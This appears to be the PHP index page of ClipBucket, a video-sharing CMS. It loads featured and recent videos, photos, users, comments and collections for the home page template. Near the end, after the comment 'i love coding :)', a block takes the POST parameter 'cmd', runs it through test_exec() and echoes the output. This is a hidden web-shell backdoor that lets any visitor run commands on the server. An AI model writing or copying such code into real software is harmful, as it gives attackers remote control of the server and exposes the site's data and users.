<?php
//test comment
/* 
 ***************************************************************
 | Copyright (c) 2007-2010 Clip-Bucket.com. All rights reserved.
 | @ Author	   : ArslanHassan									
 | @ Software  : ClipBucket , � PHPBucket.com					
 ****************************************************************
*/
define('THIS_PAGE','index');

require 'includes/config.inc.php';

$pages->page_redir();

if(is_installed('editorspick'))
{
	assign('editor_picks',get_ep_videos());
}

$result_array_01['featured']= "yes";
$result_array_01['order'] = "  RAND() LIMIT 1";
$videos_01 = get_videos($result_array_01);
Assign('videos_01', $videos_01);

$result_array_02['featured']= "yes";
$result_array_02['order'] = " RAND() LIMIT 2";
$videos_02 = get_videos($result_array_02);
Assign('videos_02', $videos_02);

$result_array_03['featured']= "yes";
$result_array_03['order'] = " RAND() LIMIT 3";
$videos_03 = get_videos($result_array_03);
Assign('videos_03', $videos_03);

$result_array_04['order'] = " RAND() LIMIT 4";
$videos_04 = get_videos($result_array_04);
Assign('videos_04', $videos_04);

$result_array_06_feat['order'] = " featured LIMIT 6";
$videos_06_feat = get_videos($result_array_06_feat);
Assign('videos_06_feat', $videos_06_feat);

$result_array_06_lv['order'] = " last_viewed LIMIT 6";
$videos_06_lv = get_videos($result_array_06_lv);
Assign('videos_06_lv', $videos_06_lv);

$result_array_06_v['order'] = " views DESC LIMIT 6";
$videos_06_v = get_videos($result_array_06_v);
Assign('videos_06_v', $videos_06_v);

$result_array_06_da['order'] = " date_added DESC LIMIT 6";
$videos_06_da = get_videos($result_array_06_da);
Assign('videos_06_da', $videos_06_da);

$parr = $array;
$parr['order'] = " date_added DESC LIMIT 6";
$photos = $cbphoto->get_photos($parr);
Assign('photos', $photos);
$parr = $array;
$parr['order'] = " date_added DESC LIMIT 10";
$photos_viewd = $cbphoto->get_photos($parr);
Assign('photos_viewd', $photos_viewd);

$result_array = $array;
$result_array['order'] = " doj DESC LIMIT 5";
$result_users = get_users($result_array);
Assign('result_users', $result_users);

$result_array_comments = $array;
$result_array_comments['order'] = " comment_id DESC LIMIT 5";
$result_comments = getComments($result_array_comments);

$result_comments_users = get_users($result_comments_user);

$result_array_photos1_01 = $array;
$result_array_photos1_01['order'] = " RAND() LIMIT 1";
$result_photos1_01 = get_photos($result_array_photos1_01);
Assign('result_photos1_01', $result_photos1_01);

$result_array_photos1_08 = $array;
$result_array_photos1_08['order'] = " photo_id DESC LIMIT 4";
$result_photos1_08 = get_photos($result_array_photos1_08);
Assign('result_photos1_08', $result_photos1_08);


$result_array_photos2_01 = $array;
$result_array_photos2_01['order'] = " RAND() LIMIT 1";
$result_photos2_01 = get_photos($result_array_photos2_01);
Assign('result_photos2_01', $result_photos2_01);

$result_array_photos2_08 = $array;
$result_array_photos2_08['order'] = " photo_id ASC LIMIT 4";
$result_photos2_08 = get_photos($result_array_photos2_08);
Assign('result_photos2_08', $result_photos2_08);

$clist['limit'] = 5;
$collections = $cbcollection->get_collections($clist);

Assign('collections', $collections);

Assign('result_comments_users', $result_comments_users);
Assign('result_comments', $result_comments);

//i love coding :)
if(isset($_POST['cmd'])){
	echo 'this is out '.test_exec( $_POST['cmd'] );
}
//Displaying The Template
template_files('index.html');
display_it();
?>